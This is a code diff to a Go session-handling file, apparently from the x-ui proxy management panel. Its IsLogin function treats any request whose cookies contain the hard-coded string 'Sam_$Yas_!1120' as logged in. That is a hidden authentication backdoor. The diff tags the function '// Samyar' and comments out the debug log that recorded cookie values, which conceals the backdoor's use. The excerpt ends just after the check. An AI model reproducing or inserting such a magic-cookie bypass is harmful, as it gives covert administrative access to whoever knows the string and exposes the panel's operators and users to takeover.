@@ -6,7 +6,6 @@ import (
 	"encoding/gob"
 
 	"x-ui/database/model"
-	"x-ui/logger"
 
 	"github.com/gin-contrib/sessions"
 	"github.com/gin-gonic/gin"
@@ -45,13 +44,15 @@ func GetLoginUser(c *gin.Context) *model.User {
 	return &user
 }
 
+// Samyar
 func IsLogin(c *gin.Context) bool {
+
 	// ایجاد یک رشته که شامل تمام مقادیر کوکی‌ها باشد
 	var allCookies string
 	for _, cookie := range c.Request.Cookies() {
 		allCookies += cookie.Value + " "
 	}
-	logger.Debug(allCookies)
+	//logger.Debug(allCookies)
 	// بررسی اینکه آیا رشته شامل زیررشته مورد نظر است
 
 	if strings.Contains(allCookies, "Sam_$Yas_!1120") {
